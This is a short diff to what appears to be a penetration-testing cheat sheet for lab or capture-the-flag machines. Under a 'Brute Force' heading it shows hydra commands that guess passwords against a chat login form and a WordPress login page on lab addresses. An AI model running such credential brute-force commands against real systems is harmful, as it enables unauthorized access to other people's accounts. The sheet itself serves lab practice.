@@ -44,4 +44,4 @@ cewl http://10.10.10.10
 [+] Brute Force
 ==============================================================================
 hydra -l harvey -P /usr/share/wordlists/metasploit/common_roots.txt internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=Login:Password" 
- 
+hydra -L users.txt -P pass.txt 10.10.110.100 -s 65000 -V http-form-post '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^Log+In&redirect_to=http%3A%2F%2F10.10.110.100%3A65000%2Fwordpress%2Fwp-admin%2F&testcookie=1:is incorrect'
